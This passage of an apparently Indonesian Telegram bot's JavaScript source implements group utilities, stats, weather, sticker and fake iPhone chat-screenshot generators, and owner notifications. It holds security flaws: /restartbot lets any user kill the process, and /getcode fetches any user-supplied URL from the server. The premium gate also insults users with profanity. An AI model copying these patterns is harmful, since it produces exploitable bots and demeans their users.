  bot.sendMessage(msg.chat.id, `📢 ${names}`);
});

bot.onText(/^\/admins$/, async (msg) => {
  const list = await bot.getChatAdministrators(msg.chat.id);
  const names = list.map(a => `👑 ${a.user.first_name}`).join("\n");
  bot.sendMessage(msg.chat.id, `*Daftar Admin:*\n${names}`, { parse_mode: "Markdown" });
});

bot.onText(/^\/groupinfo$/, async (msg) => {
  if (!msg.chat.title) return bot.sendMessage(msg.chat.id, "❌ Perintah ini hanya untuk grup.");
  const admins = await bot.getChatAdministrators(msg.chat.id);
  bot.sendMessage(msg.chat.id, `
👥 *Group Info*
📛 Nama: ${msg.chat.title}
🆔 ID: ${msg.chat.id}
👑 Admins: ${admins.length}
👤 Anggota: ${msg.chat.all_members_are_administrators ? "Admin semua" : "Campuran"}
  `, { parse_mode: "Markdown" });
});

bot.onText(/^\/restartbot$/, (msg) => {
  bot.sendMessage(msg.chat.id, "♻️ Restarting bot...");
  setTimeout(() => process.exit(0), 1000);
});

const statFile = './stat.json';
if (!fs.existsSync(statFile)) fs.writeFileSync(statFile, "{}");
let stat = JSON.parse(fs.readFileSync(statFile));
function saveStat(){ fs.writeFileSync(statFile, JSON.stringify(stat, null, 2)); }
bot.on('message', (msg) => {
  const id = msg.from.id;
  stat[id] = (stat[id] || 0) + 1;
  saveStat();
});

bot.onText(/^\/stat$/, (msg)=>{
  let data = Object.entries(stat).sort((a,b)=>b[1]-a[1]).slice(0,5);
  let text = "📊 5 User Paling Aktif:\n";
  data.forEach(([id,count],i)=>text+=`${i+1}. ID:${id} -> ${count} pesan\n`);
  bot.sendMessage(msg.chat.id,text);
});

bot.onText(/^\/maps (.+)/, (msg, match)=>{
  const lokasi = match[1];
  const link = `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(lokasi)}`;
  bot.sendMessage(msg.chat.id, `🗺 Lokasi ditemukan:\n${link}`);
});

const duel = {};
bot.onText(/^\/duel (@.+)/, (msg, match) => {
  duel[msg.chat.id] = match[1];
  bot.sendMessage(msg.chat.id, `${msg.from.username} menantang ${match[1]}! Gunakan /terima untuk mulai.`);
});

bot.onText(/^\/terima$/, (msg) => {
  if (!duel[msg.chat.id]) return;
  const players = [msg.from.username, duel[msg.chat.id]];
  const winner = players[Math.floor(Math.random() * players.length)];
  bot.sendMessage(msg.chat.id, `⚔ Duel dimulai...\n🏆 Pemenang: ${winner}`);
  delete duel[msg.chat.id];
});

bot.onText(/^\/speed$/, (msg) => {
  const start = Date.now();
  bot.sendMessage(msg.chat.id, "⏱ Mengukur...").then(() => {
    const end = Date.now();
    bot.sendMessage(msg.chat.id, `⚡ Respon bot: ${end - start} ms`);
  });
});

bot.onText(/^\/cuaca (.+)/, async (msg, match) => {
  const kota = match[1];
  const url = `https://wttr.in/${encodeURIComponent(kota)}?format=3`;
  try {
    const res = await fetch(url);
    const data = await res.text();
    bot.sendMessage(msg.chat.id, `🌤 Cuaca ${data}`);
  } catch {
    bot.sendMessage(msg.chat.id, "⚠ Tidak bisa mengambil data cuaca");
  }
});

bot.onText(/\/cekid/, (msg) => {
  const chatId = msg.chat.id;
  const sender = msg.from.username;
  const randomImage = getRandomImage();
  const id = msg.from.id;
  const owner = "7127454409"; // Ganti dengan ID pemilik bot
  const text12 = `Halo @${sender}
╭────⟡
│ 👤 Nama: @${sender}
│ 🆔 ID: ${id}
╰────⟡
<blockquote>by @k4ezue</blockquote>
`;
  const keyboard = {
    reply_markup: {
      inline_keyboard: [
        [
        [{ text: "OWNER", url: "https://t.me/k4ezue" }],
        ],
      ],
    },
  };
  bot.sendPhoto(chatId, randomImage, {
    caption: text12,
    parse_mode: "HTML",
    reply_markup: keyboard,
  });
});

bot.onText(/^\/whoami$/, (msg) => {
  const user = msg.from;
  const info = `
🪪 <b>Data Profil Kamu</b>
━━━━━━━━━━━━━━━━━━
👤 Nama: ${user.first_name || "-"} ${user.last_name || ""}
🏷 Username: @${user.username || "Tidak ada"}
🆔 ID: <code>${user.id}</code>
🌐 Bahasa: ${user.language_code || "unknown"}
  `;
  bot.sendMessage(msg.chat.id, info, { parse_mode: "HTML" });
});

// =========================
// 🚫 AntiLink Simple Version
// =========================

let antiLink = true; // default aktif
const linkPattern = /(https?:\/\/|t\.me|www\.)/i;

// Command /antilink on/off
bot.onText(/^\/antilink (on|off)$/i, (msg, match) => {
  const chatId = msg.chat.id;
  const status = match[1].toLowerCase();

  if (status === "on") {
    antiLink = true;
    bot.sendMessage(chatId, "✅ AntiLink diaktifkan!");
  } else {
    antiLink = false;
    bot.sendMessage(chatId, "⚙️ AntiLink dimatikan!");
  }
});

// Hapus pesan jika ada link
bot.on("message", (msg) => {
  if (!antiLink) return;
  if (!msg.text) return;

  const chatId = msg.chat.id;
  if (linkPattern.test(msg.text)) {
    bot.deleteMessage(chatId, msg.message_id).catch(() => {});
    bot.sendMessage(chatId, "🚫 Pesan berisi link telah dihapus otomatis!");
  }
});

bot.onText(/\/getcode (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
   const senderId = msg.from.id;
   const randomImage = getRandomImage();
    const userId = msg.from.id;
            //cek prem //
if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `
<blockquote>The ⵢ Leviathan  ⚘</blockquote>
Oi kontol kalo mau akses comandd ini,
/addprem dulu bego 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "X - DEVLOVER", url: "https://t.me/k4ezue" }], 
      ]
    }
  });
}
  const url = (match[1] || "").trim();
  if (!/^https?:\/\//i.test(url)) {
    return bot.sendMessage(chatId, "♥️ /getcode https://namaweb");
  }

  try {
    const response = await axios.get(url, {
      responseType: "text",
      headers: { "User-Agent": "Mozilla/5.0 (compatible; Bot/1.0)" },
      timeout: 20000
    });
    const htmlContent = response.data;

    const filePath = path.join(__dirname, "web_source.html");
    fs.writeFileSync(filePath, htmlContent, "utf-8");

    await bot.sendDocument(chatId, filePath, {
      caption: `✅ CODE DARI ${url}`
    });

    fs.unlinkSync(filePath);
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "♥️🥹 ERROR SAAT MENGAMBIL CODE WEB");
  }
});

bot.onText(/\/panelinfo/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  // Daftar ID owner dari config.js
  const ownerIds = config.OWNER_ID || [];

  // Cek apakah user adalah owner
  if (!ownerIds.includes(String(userId))) {
    return bot.sendMessage(chatId, "❌ Hanya owner yang bisa melihat informasi panel ini!");
  }

  // Jika owner, tampilkan info sistem
  const os = require("os");
  const axios = require("axios");

  const hostname = os.hostname();
  const platform = os.platform();
  const arch = os.arch();
  const cpuModel = os.cpus()[0].model;
  const cpuCore = os.cpus().length;
  const totalMem = Math.round(os.totalmem() / 1024 / 1024);
  const uptimeOs = Math.floor(os.uptime() / 3600);
  const now = new Date().toLocaleString("id-ID");

  // Ambil IP publik
  let ip = "Tidak terdeteksi";
  try {
    const res = await axios.get("https://api.ipify.org?format=json");
    ip = res.data.ip;
  } catch (e) {
    ip = "Tidak terhubung ke internet";
  }

  const text = `
💻 <blockquote>PANEL INFORMATION<blockquote>
━━━━━━━━━━━━━━━━━━
🖥️ <b>Hostname:</b> ${hostname}
🧠 <b>CPU:</b> ${cpuModel} (${cpuCore} Core)
💾 <b>Total RAM:</b> ${totalMem} MB
⚙️ <b>OS:</b> ${platform.toUpperCase()} (${arch})
📡 <b>Public IP:</b> ${ip}
⏱️ <b>Uptime Server:</b> ${uptimeOs} jam
📅 <b>Waktu:</b> ${now}
━━━━━━━━━━━━━━━━━━
<blockquote>Data real-time dari panel host kamu.<blockquote>
`;

  await bot.sendMessage(chatId, text, { parse_mode: "HTML" });
});

bot.onText(/^\/chatowner(?:\s+(.+))?/, async (msg, match) => {
  try {
    const OWNER_ID = 1383227288; // Ganti dengan ID owner kamu
    const userId = msg.from.id;
    const chatId = msg.chat.id;
    const text = (match[1] || "").trim();
    const name = msg.from.first_name || "Tanpa Nama";

    if (!text)
      return bot.sendMessage(chatId, "⚠️ Format salah.\nGunakan: /chatowner <isi permintaan fitur>");

    const message = `
📩 *Permintaan Fitur Baru*  
👤 Dari: ${name}  
🆔 ID: ${userId}  

💬 Pesan:  
${text}
    `;

    await bot.sendMessage(OWNER_ID, message, { parse_mode: "Markdown" });
    await bot.sendMessage(chatId, "✅ Permintaan fitur kamu sudah dikirim ke owner.");
  } catch (err) {
    console.error("❌ Error di /reqfitur:", err.message);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengirim permintaan fitur.");
  }
});

bot.onText(/^\/brat(?: (.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const argsRaw = match[1];

  if (!argsRaw) {
    return bot.sendMessage(chatId, 'Gunakan: /brat <teks> [--gif] [--delay=500]');
  }

  try {
    const args = argsRaw.split(' ');

    const textParts = [];
    let isAnimated = false;
    let delay = 500;

    for (let arg of args) {
      if (arg === '--gif') isAnimated = true;
      else if (arg.startsWith('--delay=')) {
        const val = parseInt(arg.split('=')[1]);
        if (!isNaN(val)) delay = val;
      } else {
        textParts.push(arg);
      }
    }

    const text = textParts.join(' ');
    if (!text) {
      return bot.sendMessage(chatId, 'Teks tidak boleh kosong!');
    }

    // Validasi delay
    if (isAnimated && (delay < 100 || delay > 1500)) {
      return bot.sendMessage(chatId, 'Delay harus antara 100–1500 ms.');
    }

    await bot.sendMessage(chatId, '🌿 Generating stiker brat...');

    const apiUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isAnimated=${isAnimated}&delay=${delay}`;
    const response = await axios.get(apiUrl, {
      responseType: 'arraybuffer',
    });

    const buffer = Buffer.from(response.data);

    // Kirim sticker (bot API auto-detects WebP/GIF)
    await bot.sendSticker(chatId, buffer);
  } catch (error) {
    console.error('❌ Error brat:', error.message);
    bot.sendMessage(chatId, 'Gagal membuat stiker brat. Coba lagi nanti ya!');
  }
});

bot.onText(/^\/iqc (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  if (!text) {
    return bot.sendMessage(
      chatId,
      "⚠ Gunakan: `/iqc jam|batre|carrier|pesan`\nContoh: `/iqc 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return bot.sendMessage(
      chatId,
      "⚠ Format salah!\nGunakan: `/iqc jam|batre|carrier|pesan`\nContoh: `/iqc 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  bot.sendMessage(chatId, "⏳ Tunggu sebentar...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return bot.sendMessage(chatId, "❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await bot.sendPhoto(chatId, buffer, {
      caption: `✅ Nih hasilnya`,
      parse_mode: "Markdown",
    });
  } catch (e) {
    console.error(e);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat menghubungi API.");
  }
});

// ------------------ ( Function Disini ) ------------------------ \\

/// --- ( Code Eror Kalo Script Kalian Eror ) --- \\\
function r(err) {
  const errorText = `❌ *Error Detected!*\n\`\`\`js\n${err.stack || err}\n\`\`\``;
  bot.sendMessage(OWNER_ID, errorText, {
    parse_mode: "Markdown"
  }).catch(e => console.log("Failed to send error to owner:", e));
};

process.on("uncaughtException", (err) => {
  console.error("Uncaught Exception:", err);
  r(err);
});

process.on("unhandledRejection", (reason, promise) => {
  console.error("Unhandled Rejection:", reason);
  r(reason);
});
